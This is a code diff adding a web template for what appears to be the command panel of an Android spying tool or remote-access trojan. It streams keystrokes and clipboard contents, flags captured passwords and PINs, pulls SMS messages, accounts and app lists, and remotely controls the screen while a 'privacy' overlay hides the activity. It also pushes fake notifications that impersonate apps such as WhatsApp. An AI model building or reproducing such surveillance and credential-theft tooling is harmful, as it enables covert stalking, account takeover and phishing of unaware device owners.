@@ -1,0 +1,419 @@
+{% extends "base.html" %}
+{% block title %}Control — {{ device_id }}{% endblock %}
+{% block content %}
+<div class="fade-in">
+    <!-- Device Header -->
+    <div class="device-header">
+        <div class="device-avatar"><i class="fas fa-mobile-alt"></i></div>
+        <div style="flex:1;">
+            <h3 id="deviceModel" style="font-size:1.1rem;margin-bottom:2px;">Loading...</h3>
+            <div class="device-meta">
+                <span class="device-meta-item"><i class="fas fa-fingerprint"></i> <span id="devId">{{ device_id }}</span></span>
+                <span class="device-meta-item"><i class="fas fa-battery-half"></i> <span id="devBattery">--%</span></span>
+                <span class="device-meta-item" id="devStatus"><i class="fas fa-circle"></i> Checking...</span>
+            </div>
+        </div>
+        <a href="/" class="btn-ghost"><i class="fas fa-arrow-left" style="margin-right:6px;"></i>Back</a>
+    </div>
+
+    <!-- Feature Tabs -->
+    <div class="tab-nav" style="margin-bottom:24px;">
+        <button class="tab-btn active" onclick="switchTab('keylogger')"><i class="fas fa-keyboard"></i> Keylogger & Clipboard</button>
+        <button class="tab-btn" onclick="switchTab('accounts')"><i class="fas fa-user-circle"></i> Accounts</button>
+        <button class="tab-btn" onclick="switchTab('apps')"><i class="fas fa-th-list"></i> Installed Apps</button>
+        <button class="tab-btn" onclick="switchTab('sms')"><i class="fas fa-sms"></i> SMS Messages</button>
+        <button class="tab-btn" onclick="switchTab('remote')"><i class="fas fa-mobile-alt"></i> Remote Control</button>
+        <button class="tab-btn" onclick="switchTab('notification')"><i class="fas fa-bell"></i> Send Notification</button>
+    </div>
+
+    <!-- TAB: Keylogger -->
+    <div id="tab-keylogger" class="tab-content active">
+        <div class="card">
+            <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
+                <h4 style="font-size:0.95rem;"><i class="fas fa-keyboard text-warning-c" style="margin-right:8px;"></i>Live Feed</h4>
+                <span class="live-badge"><span class="live-dot"></span>LIVE</span>
+            </div>
+            <div style="padding:20px;max-height:600px;overflow-y:auto;" id="keylogList">
+                <div class="empty-state"><i class="fas fa-keyboard"></i><p>Waiting for keystrokes or clipboard...</p></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- TAB: Accounts -->
+    <div id="tab-accounts" class="tab-content">
+        <div class="card">
+            <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
+                <h4 style="font-size:0.95rem;"><i class="fas fa-user-circle text-primary-c" style="margin-right:8px;"></i>Device Accounts</h4>
+                <button class="btn-ghost" onclick="sendCommand('exportAccounts')" style="padding:5px 12px;font-size:0.72rem;"><i class="fas fa-sync-alt" style="margin-right:4px;"></i>Request Accounts</button>
+            </div>
+            <div style="padding:20px;" id="accountsList">
+                <div class="empty-state"><i class="fas fa-user-slash"></i><p>Click 'Request Accounts' to fetch.</p></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- TAB: Apps -->
+    <div id="tab-apps" class="tab-content">
+        <div class="card">
+            <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
+                <h4 style="font-size:0.95rem;"><i class="fas fa-th-list text-accent" style="margin-right:8px;"></i>Installed Apps</h4>
+                <button class="btn-ghost" onclick="sendCommand('getApps')" style="padding:5px 12px;font-size:0.72rem;"><i class="fas fa-sync-alt" style="margin-right:4px;"></i>Fetch Apps</button>
+            </div>
+            <div style="padding:20px;" id="appsList">
+                <div class="empty-state"><i class="fas fa-box-open"></i><p>Click 'Fetch Apps' to load.</p></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- TAB: SMS -->
+    <div id="tab-sms" class="tab-content">
+        <div class="card">
+            <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
+                <h4 style="font-size:0.95rem;"><i class="fas fa-sms text-success-c" style="margin-right:8px;"></i>SMS Messages</h4>
+                <button class="btn-ghost" onclick="sendCommand('getSMS')" style="padding:5px 12px;font-size:0.72rem;"><i class="fas fa-sync-alt" style="margin-right:4px;"></i>Fetch Inbox</button>
+            </div>
+            <div style="padding:20px;max-height:600px;overflow-y:auto;" id="smsListContainer">
+                <div class="empty-state"><i class="fas fa-envelope"></i><p>Click 'Fetch Inbox' or wait for a new message...</p></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- TAB: Remote Control -->
+    <div id="tab-remote" class="tab-content">
+        <div class="card">
+            <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
+                <h4 style="font-size:0.95rem;"><i class="fas fa-mobile-alt text-success-c" style="margin-right:8px;"></i>Stealth Screen & Control</h4>
+                <div>
+                    <button class="btn-primary-glow" onclick="startRemote()" style="padding:5px 12px;font-size:0.72rem;">Start</button>
+                    <button class="btn-danger-ghost" onclick="stopRemote()" style="padding:5px 12px;font-size:0.72rem;">Stop</button>
+                    <button class="btn-ghost" onclick="togglePrivacy()" id="privacyBtn" style="padding:5px 12px;font-size:0.72rem;margin-left:5px;"><i class="fas fa-mask"></i> Privacy Off</button>
+                </div>
+            </div>
+            
+            <div style="padding:10px;display:flex;gap:10px;justify-content:center;background:var(--card-bg-hover);">
+                <button class="btn-ghost" onclick="sendGlobal('back')"><i class="fas fa-chevron-left"></i> Back</button>
+                <button class="btn-ghost" onclick="sendGlobal('home')"><i class="fas fa-circle"></i> Home</button>
+                <button class="btn-ghost" onclick="sendGlobal('recents')"><i class="fas fa-square"></i> Recents</button>
+            </div>
+
+            <div style="padding:20px;display:flex;justify-content:center;position:relative;">
+                <div id="screenCanvas" style="width:300px;height:600px;background:#1a1a2e;position:relative;overflow:hidden;border:2px solid var(--primary);border-radius:12px;cursor:crosshair;" onclick="handleScreenClick(event)">
+                    <div class="empty-state" id="screenWait"><i class="fas fa-eye-slash"></i><p>Click Start to view screen layout...</p></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- TAB: Notification -->
+    <div id="tab-notification" class="tab-content">
+        <div class="card">
+            <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
+                <h4 style="font-size:0.95rem;"><i class="fas fa-bell text-warning-c" style="margin-right:8px;"></i>Send Custom Push Notification</h4>
+            </div>
+            <div style="padding:20px;">
+                <div style="display:flex;flex-direction:column;gap:15px;max-width:500px;margin:0 auto;">
+                    <div>
+                        <label style="display:block;margin-bottom:5px;font-size:0.85rem;color:var(--text-muted);">Target App Package (e.g. com.whatsapp)</label>
+                        <input type="text" id="notifPackage" class="chat-input" placeholder="com.whatsapp" value="com.whatsapp" style="width:100%;padding:10px;border-radius:8px;">
+                    </div>
+                    <div>
+                        <label style="display:block;margin-bottom:5px;font-size:0.85rem;color:var(--text-muted);">Notification Title</label>
+                        <input type="text" id="notifTitle" class="chat-input" placeholder="WhatsApp" value="WhatsApp" style="width:100%;padding:10px;border-radius:8px;">
+                    </div>
+                    <div>
+                        <label style="display:block;margin-bottom:5px;font-size:0.85rem;color:var(--text-muted);">Notification Message</label>
+                        <textarea id="notifMessage" class="chat-input" placeholder="You have 2 new messages" style="width:100%;padding:10px;border-radius:8px;height:80px;"></textarea>
+                    </div>
+                    <button class="btn-primary-glow" onclick="sendCustomNotification()" style="padding:12px;font-weight:bold;"><i class="fas fa-paper-plane" style="margin-right:8px;"></i>Send Notification to Target</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+{% endblock %}
+
+{% block scripts %}
+<style>
+.node-box {
+    position: absolute;
+    border: 1px solid rgba(0,255,150,0.3);
+    background: rgba(0,0,0,0.4);
+    color: #fff;
+    font-size: 10px;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    user-select: none;
+    pointer-events: none;
+}
+.node-box.clickable {
+    border: 1px solid rgba(255,200,0,0.6);
+    background: rgba(255,200,0,0.1);
+}
+</style>
+<script>
+const UID = "{{ user_id }}";
+const DID = "{{ device_id }}";
+const devRef = fbDb.ref('users/' + UID + '/devices/' + DID);
+
+let deviceWidth = 1080;
+let deviceHeight = 2400;
+let isRemoteActive = false;
+let isPrivacyOn = false;
+
+function switchTab(name) {
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.getElementById('tab-' + name).classList.add('active');
+    event.currentTarget.classList.add('active');
+}
+
+function sendCommand(cmd, value = true) {
+    devRef.child('commands/' + cmd).set(value);
+    alert('Command sent: ' + cmd);
+}
+
+// Remote Control
+function startRemote() {
+    devRef.child('screenConfig').set({ enabled: true, interval: 1000, privacyScreen: isPrivacyOn });
+    isRemoteActive = true;
+    document.getElementById('screenWait').style.display = 'none';
+}
+function stopRemote() {
+    devRef.child('screenConfig').update({ enabled: false, privacyScreen: false });
+    isRemoteActive = false;
+    isPrivacyOn = false;
+    document.getElementById('privacyBtn').innerHTML = '<i class="fas fa-mask"></i> Privacy Off';
+    document.getElementById('screenCanvas').innerHTML = '<div class="empty-state" id="screenWait"><i class="fas fa-eye-slash"></i><p>Remote stopped.</p></div>';
+}
+function togglePrivacy() {
+    isPrivacyOn = !isPrivacyOn;
+    devRef.child('screenConfig/privacyScreen').set(isPrivacyOn);
+    const btn = document.getElementById('privacyBtn');
+    if(isPrivacyOn) {
+        btn.innerHTML = '<i class="fas fa-mask" style="color:#ff4757;"></i> Privacy ON';
+        btn.style.borderColor = '#ff4757';
+    } else {
+        btn.innerHTML = '<i class="fas fa-mask"></i> Privacy Off';
+        btn.style.borderColor = 'transparent';
+    }
+}
+function sendGlobal(action) {
+    devRef.child('commands/globalAction').set(action);
+}
+
+function sendCustomNotification() {
+    const pkg = document.getElementById('notifPackage').value.trim();
+    const title = document.getElementById('notifTitle').value.trim();
+    const msg = document.getElementById('notifMessage').value.trim();
+    
+    if (!pkg || !title || !msg) {
+        alert("Please fill all fields!");
+        return;
+    }
+    
+    devRef.child('commands/customNotification').set({
+        targetPackage: pkg,
+        title: title,
+        message: msg,
+        time: Date.now()
+    });
+    alert("Notification command sent!");
+    document.getElementById('notifMessage').value = '';
+}
+
+function handleScreenClick(e) {
+    if (!isRemoteActive) return;
+    const rect = e.currentTarget.getBoundingClientRect();
+    const clickX = e.clientX - rect.left;
+    const clickY = e.clientY - rect.top;
+    
+    const actualX = (clickX / rect.width) * deviceWidth;
+    const actualY = (clickY / rect.height) * deviceHeight;
+    devRef.child('commands/tap').set({ x: actualX, y: actualY });
+    
+    const ripple = document.createElement('div');
+    ripple.style.position = 'absolute';
+    ripple.style.left = clickX + 'px';
+    ripple.style.top = clickY + 'px';
+    ripple.style.width = '20px';
+    ripple.style.height = '20px';
+    ripple.style.transform = 'translate(-50%, -50%)';
+    ripple.style.background = 'rgba(255,255,255,0.7)';
+    ripple.style.borderRadius = '50%';
+    ripple.style.pointerEvents = 'none';
+    ripple.style.animation = 'rippleAnim 0.4s ease-out';
+    e.currentTarget.appendChild(ripple);
+    setTimeout(() => ripple.remove(), 400);
+}
+document.head.insertAdjacentHTML('beforeend', '<style>@keyframes rippleAnim { to { transform: translate(-50%, -50%) scale(3); opacity: 0; } }</style>');
+
+// Screen Render
+devRef.child('screenInfo').on('value', s => {
+    const info = s.val();
+    if (info && info.width && info.height) {
+        deviceWidth = info.width;
+        deviceHeight = info.height;
+        const canvas = document.getElementById('screenCanvas');
+        canvas.style.height = (300 * (deviceHeight / deviceWidth)) + 'px';
+    }
+});
+
+devRef.child('screenTree').on('value', s => {
+    if (!isRemoteActive) return;
+    const payloadStr = s.val();
+    if (!payloadStr) return;
+    try {
+        const payload = typeof payloadStr === 'string' ? JSON.parse(payloadStr) : payloadStr;
+        const tree = payload.tree;
+        if (!tree) return;
+        
+        const canvas = document.getElementById('screenCanvas');
+        canvas.innerHTML = '';
+        
+        const scaleX = canvas.offsetWidth / deviceWidth;
+        const scaleY = canvas.offsetHeight / deviceHeight;
+
+        function renderNode(node) {
+            if (node.b && node.b.length === 4) {
+                const [left, top, right, bottom] = node.b;
+                if (right > left && bottom > top) {
+                    const div = document.createElement('div');
+                    div.className = 'node-box' + (node.ck ? ' clickable' : '');
+                    div.style.left = (left * scaleX) + 'px';
+                    div.style.top = (top * scaleY) + 'px';
+                    div.style.width = ((right - left) * scaleX) + 'px';
+                    div.style.height = ((bottom - top) * scaleY) + 'px';
+                    
+                    if (node.t) div.innerText = node.t;
+                    else if (node.d) div.innerText = node.d;
+                    else if (node.ck) div.innerText = '[Btn]';
+                    
+                    canvas.appendChild(div);
+                }
+            }
+            if (node.n && Array.isArray(node.n)) {
+                node.n.forEach(child => renderNode(child));
+            }
+        }
+        renderNode(tree);
+    } catch (e) { console.error(e); }
+});
+
+// Logs, Health, Accounts
+devRef.child('health').on('value', s => {
+    const h = s.val() || {};
+    document.getElementById('devBattery').textContent = (h.battery || 0) + '%';
+    const online = h.online === true || h.online === 'true' || h.online === 1;
+    const el = document.getElementById('devStatus');
+    el.innerHTML = online ? '<i class="fas fa-circle" style="color:var(--success);font-size:8px;"></i> Online' : '<i class="fas fa-circle" style="color:var(--danger);font-size:8px;opacity:0.5;"></i> Offline';
+});
+devRef.child('info/model').on('value', s => { document.getElementById('deviceModel').textContent = s.val() || 'Unknown Device'; });
+
+function renderLogs() {
+    devRef.child('logs').orderByKey().limitToLast(100).once('value', s => {
+        const data = s.val();
+        const container = document.getElementById('keylogList');
+        if (!data) { container.innerHTML = '<div class="empty-state"><i class="fas fa-keyboard"></i><p>No logs available.</p></div>'; return; }
+        let h = '';
+        Object.keys(data).reverse().forEach(k => {
+            const v = data[k];
+            const text = typeof v === 'string' ? v : (v.log || JSON.stringify(v));
+            const time = v.time ? new Date(v.time).toLocaleString() : '';
+            
+            let highlightStyle = '';
+            if (text.includes('🔥 [KEYBOARD]')) {
+                highlightStyle = 'border-color: #ff4757; background: rgba(255, 71, 87, 0.05);';
+            } else if (text.toLowerCase().includes('password') || text.toLowerCase().includes('pin')) {
+                highlightStyle = 'border-color: #ffa502; background: rgba(255, 165, 2, 0.05);';
+            } else if (text.includes('ScreenText]')) {
+                highlightStyle = 'border-color: #1e90ff; background: rgba(30, 144, 255, 0.05);';
+            } else if (text.includes('[SMS RECEIVED]')) {
+                highlightStyle = 'border-color: #2ed573; background: rgba(46, 213, 115, 0.05);';
+            }
+            
+            h += `<div class="keylog-entry" style="${highlightStyle}"><div class="keylog-text">${text}</div><div class="keylog-time">${time}</div></div>`;
+        });
+        container.innerHTML = h;
+    });
+}
+renderLogs();
+devRef.child('logs').on('child_added', () => renderLogs());
+
+devRef.child('clipboard').on('value', s => {
+    const text = s.val();
+    if(text) {
+        const container = document.getElementById('keylogList');
+        const h = `<div class="keylog-entry" style="border-color:var(--primary);"><div class="keylog-app"><i class="fas fa-clipboard"></i> CLIPBOARD</div><div class="keylog-text">${text}</div></div>`;
+        container.insertAdjacentHTML('afterbegin', h);
+    }
+});
+
+devRef.child('accounts').on('value', s => {
+    const data = s.val();
+    const container = document.getElementById('accountsList');
+    if (!data) { container.innerHTML = '<div class="empty-state"><i class="fas fa-user-slash"></i><p>No accounts found.</p></div>'; return; }
+    let items = Array.isArray(data) ? data : Object.values(data);
+    let h = '';
+    items.forEach(acc => {
+        const name = acc.name || 'Unknown';
+        const type = acc.type || 'Google';
+        h += `<div class="account-item"><div class="account-avatar"><i class="fas fa-user"></i></div><div><div class="account-email">${name}</div><div class="account-type">${type}</div></div></div>`;
+    });
+    container.innerHTML = h;
+});
+
+// Apps
+devRef.child('installedApps').on('value', s => {
+    const data = s.val();
+    const container = document.getElementById('appsList');
+    if (!data) { container.innerHTML = '<div class="empty-state"><i class="fas fa-box-open"></i><p>No apps found.</p></div>'; return; }
+    
+    let items = Array.isArray(data) ? data : Object.values(data);
+    let h = '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">';
+    items.forEach(app => {
+        const name = app.name || 'Unknown App';
+        const pkg = app.package || 'unknown.package';
+        h += `<div style="background:var(--card-bg-hover);padding:10px;border-radius:8px;border:1px solid var(--border-color);"><div style="font-weight:600;font-size:0.9rem;color:#fff;margin-bottom:4px;">${name}</div><div style="font-size:0.7rem;color:var(--text-muted);word-break:break-all;">${pkg}</div></div>`;
+    });
+    h += '</div>';
+    container.innerHTML = h;
+});
+
+// SMS
+devRef.child('smsList').on('value', s => {
+    const data = s.val();
+    const container = document.getElementById('smsListContainer');
+    if (!data) { container.innerHTML = '<div class="empty-state"><i class="fas fa-envelope"></i><p>No SMS found.</p></div>'; return; }
+    
+    let items = Array.isArray(data) ? data : Object.values(data);
+    // Sort items by time descending (if 'time' is available)
+    items.sort((a, b) => (b.time || 0) - (a.time || 0));
+    
+    let h = '<div style="display:flex;flex-direction:column;gap:12px;">';
+    items.forEach(sms => {
+        const sender = sms.sender || 'Unknown';
+        const body = sms.body || '';
+        const time = sms.time ? new Date(sms.time).toLocaleString() : '';
+        const isInbox = sms.type === 'inbox' || sms.type === 'incoming';
+        
+        const iconColor = isInbox ? 'var(--success)' : 'var(--primary)';
+        const iconClass = isInbox ? 'fa-arrow-down' : 'fa-arrow-up';
+        
+        h += `
+        <div style="background:var(--card-bg-hover);padding:15px;border-radius:8px;border-left:4px solid ${iconColor};">
+            <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
+                <div style="font-weight:bold;color:#fff;"><i class="fas ${iconClass}" style="margin-right:6px;font-size:0.8rem;color:${iconColor};"></i>${sender}</div>
+                <div style="font-size:0.75rem;color:var(--text-muted);">${time}</div>
+            </div>
+            <div style="font-size:0.9rem;color:#ccc;white-space:pre-wrap;word-break:break-word;">${body}</div>
+        </div>`;
+    });
+    h += '</div>';
+    container.innerHTML = h;
+});
+</script>
+{% endblock %}
